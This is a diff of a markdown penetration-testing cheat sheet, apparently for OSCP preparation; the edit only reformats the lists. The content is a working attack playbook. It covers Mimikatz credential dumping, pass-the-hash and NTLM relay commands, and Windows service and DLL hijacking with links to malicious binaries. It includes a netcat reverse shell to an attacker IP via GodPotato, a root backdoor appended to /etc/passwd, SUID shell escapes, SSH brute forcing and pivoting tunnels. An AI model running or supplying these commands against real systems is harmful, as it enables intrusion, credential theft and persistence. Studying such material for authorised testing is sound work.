@@ -535,275 +535,532 @@ c $1 $3 $7 $#
 	1. append this to the bottom of /etc/john/john.conf
 	2. john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules hash.ssh
 
+
 3. `hash-id` and `hash-identifier` can be used to identify hash types
+
 4. [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
+
 5. `hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule`
+
 6. `john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash`
+
 7. extracting local Windows hashes:
-	1. `Get-LocalUser`
-	2. `.\Invoke-Mimikatz` or `Mimikatz.exe`
-	3. `privilege::debug`
-	4. `token::elevate`
-	5. `sekurlsa::logonpasswords`          (extract passwords and hashes)
-	6. `lsadump::sam`                                (dump NTLM hashes from SAM)
-	7. `hashcat -m 1000 hash.ntlm /usr/share/wordlist/rockyou.txt -r /usr/share/hashcat/rules/best64.rule` 
+
+ 	1. `Get-LocalUser`
+	
+ 	2. `.\Invoke-Mimikatz` or `Mimikatz.exe`
+	
+ 	3. `privilege::debug`
+	
+ 	4. `token::elevate`
+	
+ 	5. `sekurlsa::logonpasswords`          (extract passwords and hashes)
+	
+ 	6. `lsadump::sam`                                (dump NTLM hashes from SAM)
+	
+ 	7. `hashcat -m 1000 hash.ntlm /usr/share/wordlist/rockyou.txt -r /usr/share/hashcat/rules/best64.rule` 
+
 8. Passing NTLM hashes:
-	1. Tools: `Mimikatz, crackmapexec, smbclient, impacket-*, WinRM, xfreerdp`
-	2. `smbclient //10.0.0.174/secrets -U Administrator --pw-nt-hash 8846f7eaee8fb117ad06bdd830b7586c`
-	3. `impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c Administrator@10.0.0.174`        (same syntax for wmiexec, smbexec)
+
+ 	1. Tools: `Mimikatz, crackmapexec, smbclient, impacket-*, WinRM, xfreerdp`
+	
+ 	2. `smbclient //10.0.0.174/secrets -U Administrator --pw-nt-hash 8846f7eaee8fb117ad06bdd830b7586c`
+	
+ 	3. `impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c Administrator@10.0.0.174`        (same syntax for wmiexec, smbexec)
+
 9. Capturing and cracking Net-NTLMv2:
-	1. `sudo responder -I tun0 --analyze`              (listen for hashes without poisoning)
-	2. `dir \\192.168.45.204\share`                     (force an authentication from the victim)
-	3. `hashcat -m 5600 hash.netntlm /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.txt`
+
+ 	1. `sudo responder -I tun0 --analyze`              (listen for hashes without poisoning)
+	
+ 	2. `dir \\192.168.45.204\share`                     (force an authentication from the victim)
+	
+ 	3. `hashcat -m 5600 hash.netntlm /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.txt`
+
 10. relaying Net-NTLMv2 hashes:
-	1. `nc -nvlp 1337`
-	2. `impacket-ntlmrelayx --no-http-server -smb2support -t 10.0.0.174 -c "powershell -EncodedCommand <base64-encoded-PS>"`
-	3. `dir \\192.168.45.204\share`      (authenticate to the relay server from the victim)
+
+ 	1. `nc -nvlp 1337`
+	
+ 	2. `impacket-ntlmrelayx --no-http-server -smb2support -t 10.0.0.174 -c "powershell -EncodedCommand <base64-encoded-PS>"`
+	
+ 	3. `dir \\192.168.45.204\share`      (authenticate to the relay server from the victim)
 
 
 **Windows Privilege Escalation:**
+
 1. manual enumeration:
-	1. `whoami`
-	2. `whoami /groups`
-	3. `whoami /priv`
-	4. `powershell -c "Get-LocalUser"`
-		1. `net user`
-	5. `powershell -c "Get-LocalGroup"`
-		1. `net localgroup`
-	6. `powershell -c 'Get-LocalGroup "Domain Admins"'`
-	7. `systeminfo`
-	8. `ipconfig /all`
-	9. `route print`
-	10. `netstat -ano`
-	11. `powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' | select displayname"`             (enumerate installed 32-bit applications)
-	12. `powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' | select displayname"`         (enumerate installed 64-bit applications)
-	13. `dir C:\Program Files (x86)`
-	14. `dir C:\Program Files`
-	15. `powershell -c "Get-Process <process-name> | Format-List *"`         (enumerate running processes)
-	16. `Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue`                    (searching for user files)
-	17. `runas /user:Administrator cmd.exe`
-	18. `Get-History`
-	19. `(Get-PSReadlineOption).HistorySavePath`             (locate the PS history file)
-	20. `powershell -c "Get-ChildItem -Path C:\Users\ -Include *transcript*.txt -File -Recurse -ErrorAction SilentlyContinue"`      (enumerate for PS transcript file(s))
-	21. `evil-winrm -i 142.53.44.43 -u Administrator -p Password1#`
-	22. `Event Viewer > Applications and Services Logs > Microsoft > Windows > PowerShell > Operational → Location of Script Block Logs`
+
+ 	1. `whoami`
+	
+ 	2. `whoami /groups`
+	
+ 	3. `whoami /priv`
+	
+ 	4. `powershell -c "Get-LocalUser"`
+	
+  		1. `net user`
+	
+ 	5. `powershell -c "Get-LocalGroup"`
+	
+  		1. `net localgroup`
+	
+ 	6. `powershell -c 'Get-LocalGroup "Domain Admins"'`
+	
+ 	7. `systeminfo`
+	
+ 	8. `ipconfig /all`
+	
+ 	9. `route print`
+	
+ 	10. `netstat -ano`
+	
+ 	11. `powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' | select displayname"`             (enumerate installed 32-bit applications)
+	
+ 	12. `powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' | select displayname"`         (enumerate installed 64-bit applications)
+	
+ 	13. `dir C:\Program Files (x86)`
+	
+ 	14. `dir C:\Program Files`
+	
+ 	15. `powershell -c "Get-Process <process-name> | Format-List *"`         (enumerate running processes)
+	
+ 	16. `Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue`                    (searching for user files)
+	
+ 	17. `runas /user:Administrator cmd.exe`
+	
+ 	18. `Get-History`
+	
+ 	19. `(Get-PSReadlineOption).HistorySavePath`             (locate the PS history file)
+	
+ 	20. `powershell -c "Get-ChildItem -Path C:\Users\ -Include *transcript*.txt -File -Recurse -ErrorAction SilentlyContinue"`      (enumerate for PS transcript file(s))
+	
+ 	21. `evil-winrm -i 142.53.44.43 -u Administrator -p Password1#`
+	
+ 	22. `Event Viewer > Applications and Services Logs > Microsoft > Windows > PowerShell > Operational → Location of Script Block Logs`
+
 2. automated enumeration for privilege escalation:
-	1. `. .\PowerUp.ps1; Invoke-AllChecks -Format HTML`
-		1. [List of individual PowerUp.ps1 commands](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
-	2. `.\Seatbelt.exe -group=all`
-	3. `Get-Content Output.txt | Select-String -Pattern "Installed Product" -Context 0, 60`                 (parse output files)
+
+ 	1. `. .\PowerUp.ps1; Invoke-AllChecks -Format HTML`
+	
+  		1. [List of individual PowerUp.ps1 commands](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
+	
+ 	2. `.\Seatbelt.exe -group=all`
+	
+ 	3. `Get-Content Output.txt | Select-String -Pattern "Installed Product" -Context 0, 60`                 (parse output files)
+
 3. Windows Services for privilege escalation:
-	1. `services.msc, Get-Service, Get-CimInstance`
-	2. `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State-like 'Running'}`            (enumerate running services)
-	3. `icacls "C:\xampp\apache\bin\httpd.exe"`            (enumerate service executable permissions)
-	4. replacing a service binary ('F' permissions on a service binary):            
-		1. (`Get-ModifiableServiceFile`  `Get-ModifiableService`)
-		2. `icacls <service-binary>`                 (should be F for current user or group)
-		3. `x86_64-w64-mingw32-gcc windows_service.c -o service.exe` 
-			1. `service.exe` must be the name of the service being replaced!
-			2. use the already written [malicious service](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/malicious_service.c)
-		4. `net stop TargetService`
-			1. access denied = enumerate Startup Type:
-				1. `Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'TargetService'}` (grab the Startup Type)
-				2. Startup Type = auto --> a reboot will restart it (SeShutdown is required)
-				3. `shutdown /r /t 0`
-		5. `net start TargetService`
-		6. `runas /user:added_user cmd.exe`
-	6. hijacking a (service's) required DLL:           (`Find-PathDLLHijack`)
-		1. `icacls TargetService.exe`        
-			1. (if 'F', replace the binary itself; if the service binary's directory is writable, attempt to hijack a required DLL)
-		2. copy the service binary to a local Windows machine for analysis via Procmon64.exe as Administrator:
-			1. Process Name is TargetService.exe
-			2. Result contains NOT FOUND
-			3. Path contains dll
-		3. `Restart-Service TargetService`             (DLL loading happens at conception)
-		4. `x86_64-w64-mingw32-gcc malDll.cpp --shared -o RelyOnMe.dll`
-			1. the DLL must have the same name as the missing dependency
-			2. use this [malicious DLL](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/malicious_dll_2.cpp)
-		5. place the compiled DLL along the DLL search order
-		6. `Restart-Service TargetService`
-	7. unquoted service paths:                         (`Get-UnquotedService`)
-		1. vulnerability: spaces within the path to the service binary, no quotes around the path to the service binary, write permissions on one of the parent directories of the service binary's working directory
-		2. `Get-CimInstance -ClassName win32_service | Select Name,State,PathName` (enumerate running and stopped services)
-		3. `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`         
-			1. (enumerate unquoted service paths for services outside the System32 directory; does not check for spaces in the binary paths)
-		4. Compile a [malicious service](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/malicious_service.c) with the name as the first word in a (writable) directory path with a space in it (ex: `C:\Program Files\Enterprise.exe)
-		5. `Restart-Service TargetService`         (this may show an error on success)
-	8. abusing scheduled tasks:
-		1. `Get-ScheduledTask`
-		2. `schtasks /query /fo LIST /v`          (list scheduled tasks and their properties)
-		3. `schtasks /query /fo LIST /v | Select-String -Pattern "C:\\Users" -Context 10, 10`                   (scheduled tasks running out of Home directories)
-		4. `icacls job.exe`                    (check privileges on the task binary)
-		5. `x86_64-w64-mingw32-gcc exploit.c -o <action-name>`
-			1. `action-name` must be the same as the task action being replaced
-			2. [malicious binary](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/AddUser.c)
-	9. abusing user's assigned privileges:
-		1. look for:
-			1. `SeImpersonatePrivilege`
-			2. `SeBackupPrivilege`
-			3. `SeAssignPrimaryToken`
-			4. `SeLoadDriver`
-			5. `SeDebug`
-		2. SeImpersonatePrivilege:
-			1. [PrintSpoofer64.exe](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)
-				1. `.\PrintSpoofer.exe -i -c powershell.exe`
-			2. [GodPotato](https://github.com/BeichenDream/GodPotato)
-				1. `.\GodPotato.exe -cmd "C:\Services\nc.exe -e cmd.exe 192.168.45.204 443"`
+
+ 	1. `services.msc, Get-Service, Get-CimInstance`
+	
+ 	2. `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State-like 'Running'}`            (enumerate running services)
+	
+ 	3. `icacls "C:\xampp\apache\bin\httpd.exe"`            (enumerate service executable permissions)
+	
+ 	4. replacing a service binary ('F' permissions on a service binary):            
+	
+  		1. (`Get-ModifiableServiceFile`  `Get-ModifiableService`)
+		
+  		2. `icacls <service-binary>`                 (should be F for current user or group)
+		
+  		3. `x86_64-w64-mingw32-gcc windows_service.c -o service.exe` 
+		
+   			1. `service.exe` must be the name of the service being replaced!
+			
+   			2. use the already written [malicious service](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/malicious_service.c)
+		
+  		4. `net stop TargetService`
+		
+   			1. access denied = enumerate Startup Type:
+			
+    				1. `Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'TargetService'}` (grab the Startup Type)
+				
+    				2. Startup Type = auto --> a reboot will restart it (SeShutdown is required)
+				
+    				3. `shutdown /r /t 0`
+		
+  		5. `net start TargetService`
+		
+  		6. `runas /user:added_user cmd.exe`
+	
+ 	6. hijacking a (service's) required DLL:           (`Find-PathDLLHijack`)
+	
+  		1. `icacls TargetService.exe`        
+		
+   			1. (if 'F', replace the binary itself; if the service binary's directory is writable, attempt to hijack a required DLL)
+		
+  		2. copy the service binary to a local Windows machine for analysis via Procmon64.exe as Administrator:
+		
+   			1. Process Name is TargetService.exe
+			
+   			2. Result contains NOT FOUND
+			
+   			3. Path contains dll
+		
+  		3. `Restart-Service TargetService`             (DLL loading happens at conception)
+		
+  		4. `x86_64-w64-mingw32-gcc malDll.cpp --shared -o RelyOnMe.dll`
+		
+   			1. the DLL must have the same name as the missing dependency
+			
+   			2. use this [malicious DLL](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/malicious_dll_2.cpp)
+		
+  		5. place the compiled DLL along the DLL search order
+		
+  		6. `Restart-Service TargetService`
+	
+ 	7. unquoted service paths:                         (`Get-UnquotedService`)
+	
+  		1. vulnerability: spaces within the path to the service binary, no quotes around the path to the service binary, write permissions on one of the parent directories of the service binary's working directory
+		
+  		2. `Get-CimInstance -ClassName win32_service | Select Name,State,PathName` (enumerate running and stopped services)
+		
+  		3. `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`         
+		
+   			1. (enumerate unquoted service paths for services outside the System32 directory; does not check for spaces in the binary paths)
+		
+  		4. Compile a [malicious service](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/malicious_service.c) with the name as the first word in a (writable) directory path with a space in it (ex: `C:\Program Files\Enterprise.exe)
+		
+  		5. `Restart-Service TargetService`         (this may show an error on success)
+	
+ 	8. abusing scheduled tasks:
+	
+  		1. `Get-ScheduledTask`
+		
+  		2. `schtasks /query /fo LIST /v`          (list scheduled tasks and their properties)
+		
+  		3. `schtasks /query /fo LIST /v | Select-String -Pattern "C:\\Users" -Context 10, 10`                   (scheduled tasks running out of Home directories)
+		
+  		4. `icacls job.exe`                    (check privileges on the task binary)
+		
+  		5. `x86_64-w64-mingw32-gcc exploit.c -o <action-name>`
+		
+   			1. `action-name` must be the same as the task action being replaced
+			
+   			2. [malicious binary](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/AddUser.c)
+	
+ 	9. abusing user's assigned privileges:
+	
+  		1. look for:
+		
+   			1. `SeImpersonatePrivilege`
+			
+   			2. `SeBackupPrivilege`
+			
+   			3. `SeAssignPrimaryToken`
+			
+   			4. `SeLoadDriver`
+			
+   			5. `SeDebug`
+		
+  		2. SeImpersonatePrivilege:
+		
+   			1. [PrintSpoofer64.exe](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)
+			
+    				1. `.\PrintSpoofer.exe -i -c powershell.exe`
+			
+   			2. [GodPotato](https://github.com/BeichenDream/GodPotato)
+			
+    				1. `.\GodPotato.exe -cmd "C:\Services\nc.exe -e cmd.exe 192.168.45.204 443"`
 
 
 **Linux Privilege Escalation:**
+
 1. Manual Enumeration:
-	1. `id`
-	2. `cat /etc/passwd`
-	3. `hostname`
-	4. `cat /etc/issue && cat /etc/os-release && arch`
-		1. ex: `searchsploit "linux kernel Ubuntu 16 local privilege escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"`
-	5. `uname -a`
-	6. `ps aux`                                       (running processes in a readable format)
-	7. `ip a`
-	8. `route && routel`
-	9. `ss -anp`                              (list connections and their processes)
-		1. `netstat -anop`
-	10. `cat /etc/iptables/rules.v4`       (dump IPv4 rules)
-		1. `cat /etc/iptables | grep iptables-persistent`
-		2. `history | grep iptables-save`
-		3. `history | grep iptables-restore`
-	11. `ls -alh /etc/cron*`
-	12. `cat /etc/crontab`
-	13. `crontab -l`
-	14. `sudo crontab -l`
-	15. `grep "CRON" /var/log/syslog`                     (inspect the cron log file)
-		1. `cat /var/log/cron.log`
-	16. `dpkg -l`
-	17. `find / -writable -type d 2>/dev/null`
-	18. `find / -writable -type f 2>/dev/null`
-	19. `cat /etc/fstab`                     (list drives that will be mounted at boot time)
-	20. `mount`                                  (mounted filesystems)
-	21. `lslbk`                                  (available disks)
-	22. `lsmod`                                  (enumerate loaded kernel modules)
-		1. `/sbin/modinfo KernelModule`
-	23. `find / -perm -u=s type f 2>/dev/null`                  (SUID files)
-	24. `getcap -r / 2>/dev/null`                                          (capabilities; look for +ep)
-	25. `env`
-	26. `history && cat /home/<user>/.bash_history`
-	27. `hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh -V`
-	28. `sudo -l`
-	29. `sudo -i`                                (run a shell as root with root env)
-	30. `su -`                                      (switch with new user's env)
-	31. `su root`                                (switch to root without switching env)
-	32. `sudo -s`                                (run as root without root env)
-	33. `grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null`
-	34. `locate password | more`
-	35. `find / -name authorized_keys 2> /dev/null`
-	36. `find / -name id_* 2> /dev/null`
-	37. `find / -name *.pub* 2> /dev/null`
-	38. `find / -name *.bak (*backup*, *old*)`
-	39. `ls -alh /tmp/`
-	40. `watch -n 1 "ps -aux | grep pass"`               
-		1. (monitor processes/services for passwords in real time)
-	41. `sudo tcpdump -i lo -A | grep "pass"` 
-		1. (monitor loopback traffic (local services) for passwords in real time)
-	42. `ls -alh /etc/passwd /etc/shadow /etc/sudoers`
-		1. any of these files are writable = vulnerable
+
+ 	1. `id`
+	
+ 	2. `cat /etc/passwd`
+	
+ 	3. `hostname`
+	
+ 	4. `cat /etc/issue && cat /etc/os-release && arch`
+	
+  		1. ex: `searchsploit "linux kernel Ubuntu 16 local privilege escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"`
+	
+ 	5. `uname -a`
+	
+ 	6. `ps aux`                                       (running processes in a readable format)
+	
+ 	7. `ip a`
+	
+ 	8. `route && routel`
+	
+ 	9. `ss -anp`                              (list connections and their processes)
+	
+  		1. `netstat -anop`
+	
+ 	10. `cat /etc/iptables/rules.v4`       (dump IPv4 rules)
+	
+  		1. `cat /etc/iptables | grep iptables-persistent`
+		
+  		2. `history | grep iptables-save`
+		
+  		3. `history | grep iptables-restore`
+	
+ 	11. `ls -alh /etc/cron*`
+	
+ 	12. `cat /etc/crontab`
+	
+ 	13. `crontab -l`
+	
+ 	14. `sudo crontab -l`
+	
+ 	15. `grep "CRON" /var/log/syslog`                     (inspect the cron log file)
+	
+  		1. `cat /var/log/cron.log`
+	
+ 	16. `dpkg -l`
+	
+ 	17. `find / -writable -type d 2>/dev/null`
+	
+ 	18. `find / -writable -type f 2>/dev/null`
+	
+ 	19. `cat /etc/fstab`                     (list drives that will be mounted at boot time)
+	
+ 	20. `mount`                                  (mounted filesystems)
+	
+ 	21. `lslbk`                                  (available disks)
+	
+ 	22. `lsmod`                                  (enumerate loaded kernel modules)
+	
+  		1. `/sbin/modinfo KernelModule`
+	
+ 	23. `find / -perm -u=s type f 2>/dev/null`                  (SUID files)
+	
+ 	24. `getcap -r / 2>/dev/null`                                          (capabilities; look for +ep)
+	
+ 	25. `env`
+	
+ 	26. `history && cat /home/<user>/.bash_history`
+	
+ 	27. `hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh -V`
+	
+ 	28. `sudo -l`
+	
+ 	29. `sudo -i`                                (run a shell as root with root env)
+	
+ 	30. `su -`                                      (switch with new user's env)
+	
+ 	31. `su root`                                (switch to root without switching env)
+	
+ 	32. `sudo -s`                                (run as root without root env)
+	
+ 	33. `grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null`
+	
+ 	34. `locate password | more`
+	
+ 	35. `find / -name authorized_keys 2> /dev/null`
+	
+ 	36. `find / -name id_* 2> /dev/null`
+	
+ 	37. `find / -name *.pub* 2> /dev/null`
+	
+ 	38. `find / -name *.bak (*backup*, *old*)`
+	
+ 	39. `ls -alh /tmp/`
+	
+ 	40. `watch -n 1 "ps -aux | grep pass"`               
+	
+  		1. (monitor processes/services for passwords in real time)
+	
+ 	41. `sudo tcpdump -i lo -A | grep "pass"` 
+	
+  		1. (monitor loopback traffic (local services) for passwords in real time)
+	
+ 	42. `ls -alh /etc/passwd /etc/shadow /etc/sudoers`
+	
+  		1. any of these files are writable = vulnerable
+
 2. Automated Enumeration:
-	1. `unix-privesc-check standard`
-	2. `./linpeas.sh`
-	3. `./linenum.sh`
+
+ 	1. `unix-privesc-check standard`
+	
+ 	2. `./linpeas.sh`
+	
+ 	3. `./linenum.sh`
+
 3. Exploits for privilege escalation:
-	1. writing to a writable /etc/passwd:
-		1. `openssl passwd -salt test password`
-		2. `echo added_user:$1$skYZQxWx$CeIjblVc4OVHAL.a06q1C/:0:0:root:/root:/bin/bash >> /etc/passwd`
-		3. `su added_user`
-		4. `id`
-	2. pkexec binary with SUID:
-		1. [PwnKit](https://github.com/ly4k/PwnKit)
-	3. Linux kernel 5.x:
-		1. [DirtyPipe](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
-	4. SUID binary or +ep Capabilities:
-		1. [GTFOBins](https://gtfobins.github.io/)
-	5. Vim as SUID binary:
-		1. `/usr/bin/vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'`
-			1. `:py` for python2; `:py3` for python3
-	6. local git repository:
-		1. `git status`
-		2. `git log`                                        (show commit history)
-		3. `git show <commit-hash>`            (show changes between commits)
+
+ 	1. writing to a writable /etc/passwd:
+	
+  		1. `openssl passwd -salt test password`
+		
+  		2. `echo added_user:$1$skYZQxWx$CeIjblVc4OVHAL.a06q1C/:0:0:root:/root:/bin/bash >> /etc/passwd`
+		
+  		3. `su added_user`
+		
+  		4. `id`
+	
+ 	2. pkexec binary with SUID:
+	
+  		1. [PwnKit](https://github.com/ly4k/PwnKit)
+	
+ 	3. Linux kernel 5.x:
+	
+  		1. [DirtyPipe](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
+	
+ 	4. SUID binary or +ep Capabilities:
+	
+  		1. [GTFOBins](https://gtfobins.github.io/)
+	
+ 	5. Vim as SUID binary:
+	
+  		1. `/usr/bin/vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'`
+		
+   			1. `:py` for python2; `:py3` for python3
+	
+ 	6. local git repository:
+	
+  		1. `git status`
+		
+  		2. `git log`                                        (show commit history)
+		
+  		3. `git show <commit-hash>`            (show changes between commits)
 
 
 **Port Redirection and SSH tunneling:**
+
 1. port forwarding through a \*NIX host:                               
-	1. tools: (`socat, rinetd, netcat + named pipe, iptables`)
-	2. `socat -ddd TCP-LISTEN:9998,fork TCP:10.0.0.174:2222`
-		1. (bind to 0.0.0.0:9998 and forward that traffic to 10.0.0.174:2222)
-		2. (this is a port forward, no need for proxychains)
-	3. `socat TCP-LISTEN:2222,fork TCP:10.0.0.174:22`
+
+ 	1. tools: (`socat, rinetd, netcat + named pipe, iptables`)
+	
+ 	2. `socat -ddd TCP-LISTEN:9998,fork TCP:10.0.0.174:2222`
+	
+  		1. (bind to 0.0.0.0:9998 and forward that traffic to 10.0.0.174:2222)
+		
+  		2. (this is a port forward, no need for proxychains)
+	
+ 	3. `socat TCP-LISTEN:2222,fork TCP:10.0.0.174:22`
+
 2. port forwarding through a Windows host:
-	1. `ssh.exe -N -R 9999 kali@192.168.45.204`          (bind a SOCKS proxy on attacker)
-		1. `%systemdrive%\Windows\system32\OpenSSH`    (default location)
-	2. `cmd.exe /c echo y | plink.exe -ssh -l username_1 -pw Password1# -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.204`
-		1. `127.0.0.1:9833` is bound on the attacking machine (SSH server)
-		2. `127.0.0.1:3389` is the RDP socket on the local (compromised) windows client
-		3. `xfreerdp /u:<username> /p:<password> /v:127.0.0.1:9833`
-	3. using netsh:
-		1. `netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=445 connectaddress=172.16.50.55 
-		2. `netstat -anp TCP | find "9999"`
-		3. `netsh interface portproxy show all`           (show all forwarding via netsh)
-		4. `netsh advfirewall firewall add rule name="RuleOne" protocol=TCP dir=in localip=0.0.0.0 localport=9999 action=allow`
-			1. (allow ingress traffic to the bind port)
-		5. `netsh advfirewall firewall delete rule name="RuleOne"`
-		6. `netsh interface portproxy del v4tov4 listenport=9999 listenaddress=0.0.0.0`
+
+ 	1. `ssh.exe -N -R 9999 kali@192.168.45.204`          (bind a SOCKS proxy on attacker)
+	
+  		1. `%systemdrive%\Windows\system32\OpenSSH`    (default location)
+	
+ 	2. `cmd.exe /c echo y | plink.exe -ssh -l username_1 -pw Password1# -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.204`
+	
+  		1. `127.0.0.1:9833` is bound on the attacking machine (SSH server)
+		
+  		2. `127.0.0.1:3389` is the RDP socket on the local (compromised) windows client
+		
+  		3. `xfreerdp /u:<username> /p:<password> /v:127.0.0.1:9833`
+	
+ 	3. using netsh:
+	
+  		1. `netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=445 connectaddress=172.16.50.55 
+		
+  		2. `netstat -anp TCP | find "9999"`
+		
+  		3. `netsh interface portproxy show all`           (show all forwarding via netsh)
+		
+  		4. `netsh advfirewall firewall add rule name="RuleOne" protocol=TCP dir=in localip=0.0.0.0 localport=9999 action=allow`
+		
+   			1. (allow ingress traffic to the bind port)
+		
+  		5. `netsh advfirewall firewall delete rule name="RuleOne"`
+		
+  		6. `netsh interface portproxy del v4tov4 listenport=9999 listenaddress=0.0.0.0`
+
 3. tunneling/forwarding via SSH:
-	1. 4 types:
-		1. SSH Local port forward
-			1. (bind port on SSH client --> SSH server --> single destination socket)
-		2. Dynamic SSH port forward
-			1. (bind SOCKS port on SSH client --> SSH server --> internal network)
-		3. SSH remote port forward
-			1. (local bind port --> local SSH server --> compromised SSH client --> single destination socket)
-		4. SSH remote dynamic port forward
-			1. (local bind SOCKS port --> local SSH server --> compromised SSH client --> any destination socket routable from the SSH client)
-	2. SSH local port forwarding:
-		1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
-		2. `for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done`
-		3. `ssh -N -L 0.0.0.0:4455:172.16.50.217:445 user@<SSH-server>`
-			1. `-L <local-bind-interface>:<local-bind-port>:<forward-to-addr>:<forward-to-port>`
-			2. 172.16.50.217:445 is the destination socket routable from the SSH server
-		4. `ss -ntlpu | grep 4455`              (ensure 127.0.0.1:4455 is now bound)
-		5. `ssh -N -L 0.0.0.0:4242:172.16.180.217:4242 database_admin@10.4.180.215`
-	3. SSH dynamic port forwarding:
-		1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
-		2. `ssh -N -D 0.0.0.0:9999 user@10.10.10.74`
-			1. bind port 9999 on all interfaces as a SOCKS port that can take SOCKS formatted traffic and proxy it through the SSH server; this command is run on the SSH client
-		3. `echo "socks5 192.168.77.88 9999" >> /etc/proxychains4.conf`
-		4. `proxychains -q nc -v 172.16.45.66 445`              (test proxy connectivity)
-		5. `proxychains nmap -n -sT -Pn 172.16.45.0/24` 
-	4. SSH remote port forward:
-		1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
-		2. `ssh -N -R <listening-addr>:<listening-port>:<destination-addr>:<destination-port> kali@<attacker-IP>`
-		3. `ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.45.204`
-			1. `127.0.0.1:2345` is the bind port on the SSH server you control (kali)
-			2. `10.4.50.215:5432` is the destination socket routable from the compromised client
-		4. `ss -ntlpu | grep 2345`                 (verify the local port is now bound)
-	5. SSH remote dynamic port forward:
-		1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
-		2. `ssh -R <local-bind-port> user@192.168.45.204`
-			1. `ssh -R 9999 kali@192.168.45.204`
-			2. (any host routable from the compromised SSH client will be reachable via `proxychains ... 127.0.0.1:9999`)
+
+ 	1. 4 types:
+	
+  		1. SSH Local port forward
+		
+   			1. (bind port on SSH client --> SSH server --> single destination socket)
+		
+  		2. Dynamic SSH port forward
+		
+   			1. (bind SOCKS port on SSH client --> SSH server --> internal network)
+		
+  		3. SSH remote port forward
+		
+   			1. (local bind port --> local SSH server --> compromised SSH client --> single destination socket)
+		
+  		4. SSH remote dynamic port forward
+		
+   			1. (local bind SOCKS port --> local SSH server --> compromised SSH client --> any destination socket routable from the SSH client)
+	
+ 	2. SSH local port forwarding:
+	
+  		1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+		
+  		2. `for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done`
+		
+  		3. `ssh -N -L 0.0.0.0:4455:172.16.50.217:445 user@<SSH-server>`
+		
+   			1. `-L <local-bind-interface>:<local-bind-port>:<forward-to-addr>:<forward-to-port>`
+			
+   			2. 172.16.50.217:445 is the destination socket routable from the SSH server
+		
+  		4. `ss -ntlpu | grep 4455`              (ensure 127.0.0.1:4455 is now bound)
+		
+  		5. `ssh -N -L 0.0.0.0:4242:172.16.180.217:4242 database_admin@10.4.180.215`
+	
+ 	3. SSH dynamic port forwarding:
+	
+  		1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+		
+  		2. `ssh -N -D 0.0.0.0:9999 user@10.10.10.74`
+		
+   			1. bind port 9999 on all interfaces as a SOCKS port that can take SOCKS formatted traffic and proxy it through the SSH server; this command is run on the SSH client
+		
+  		3. `echo "socks5 192.168.77.88 9999" >> /etc/proxychains4.conf`
+		
+  		4. `proxychains -q nc -v 172.16.45.66 445`              (test proxy connectivity)
+		
+  		5. `proxychains nmap -n -sT -Pn 172.16.45.0/24` 
+	
+ 	4. SSH remote port forward:
+	
